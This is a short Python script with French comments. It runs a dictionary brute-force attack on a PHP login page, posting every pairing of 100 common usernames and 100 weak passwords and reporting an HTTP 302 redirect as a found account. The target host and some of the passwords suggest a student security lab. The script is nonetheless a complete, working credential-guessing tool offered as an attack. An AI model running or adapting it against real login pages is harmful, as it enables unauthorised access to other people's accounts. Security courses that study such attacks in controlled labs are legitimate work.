import requests
import sys

# --- CONFIGURATION ---
URL = "http://web/index.php"

# Liste des 100 Logins
LOGINS = [
    "admin", "root", "administrator", "webmaster", "support", "guest", "test", "user", 
    "manager", "staff", "info", "etudiant", "office", "contact", "system", "sysadmin", 
    "dev", "developer", "api", "api_user", "bot", "scanner", "git", "svn", "backup", 
    "dbadmin", "mysql", "postgres", "oracle", "ssh", "vpn", "remote", "monitor", 
    "demo", "public", "anonymous", "student", "eleve", "professeur", "it_support", 
    "helpdesk", "maintenance", "security", "audit", "compliance", "billing", "sales", 
    "marketing", "hr", "recruit", "director", "ceo", "vp", "president", "chief", 
    "lead", "clerk", "agent", "operator", "service", "mail", "postfix", "apache", 
    "www-data", "nginx", "ubuntu", "centos", "debian", "kali", "windows", "user123", 
    "etudiant123", "admin123", "john", "jane", "doe", "smith", "dupont", "martinez", 
    "garcia", "lopez", "rodriguez", "williams", "brown", "jones", "miller", "davis", 
    "clark", "lewis", "walker", "hall", "allen", "young", "king", "wright", "scott"
]

# Liste des 100 Mots de passe
PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "admin", 
    "password123", "admin123", "user123", "root", "login", "welcome", "abc123", 
    "superman", "security", "football", "", "p@ssword", "monkey", "letmein", "dragon", 
    "sunshine", "charlie", "654321", "shadow", "master", "secret", "killer", 
    "hunter2", "starwars", "soccer", "princess", "test123", "system", "oracle", 
    "mysql", "phpmyadmin", "server", "network", "cisco", "router", "hacker", 
    "access", "database", "storage", "backup", "config", "student", "university", 
    "college", "education", "learning", "school", "student123", "class2024", 
    "engineer", "computer", "software", "hardware", "internet", "google", "facebook", 
    "twitter", "youtube", "microsoft", "windows", "linux", "android", "iphone", 
    "samsung", "laptop", "desktop", "monitor", "keyboard", "mouse", "printer", 
    "camera", "iphone123", "android123", "qwertyuiop", "asdfghjkl", "zxcvbnm", 
    "111111", "222222", "333333", "444444", "555555", "666666", "777777", "888888", 
    "999999", "000000", "iloveyou", "bonjour", "maroc", "casablanca", "rabat", "gi2_securite"
]

def start_attack():
    print(f"🚀 Lancement de l'attaque sur {URL}")
    print(f"📊 {len(LOGINS)} logins x {len(PASSWORDS)} mots de passe = {len(LOGINS)*len(PASSWORDS)} combinaisons.\n")

    for user in LOGINS:
        print(f"🔍 Test de l'utilisateur : {user}", end=" ", flush=True)
        for pwd in PASSWORDS:
            try:
                # Tentative de connexion
                data = {'username': user, 'password': pwd}
                # allow_redirects=False car PHP redirige (302) en cas de succès
                response = requests.post(URL, data=data, allow_redirects=False, timeout=2)

                if response.status_code == 302:
                    print(f"\n\n✅ [SUCCÈS] Compte trouvé !")
                    print(f"   👤 Login    : {user}")
                    print(f"   🔑 Password : {pwd}\n")
                    # On continue pour trouver d'autres utilisateurs ou 'break' pour s'arrêter
                    break 
                
                print(".", end="", flush=True)

            except requests.exceptions.RequestException as e:
                print(f"\n❌ Erreur de connexion : {e}")
                sys.exit(1)
        print() # Nouvelle ligne après chaque utilisateur

if __name__ == "__main__":
    start_attack()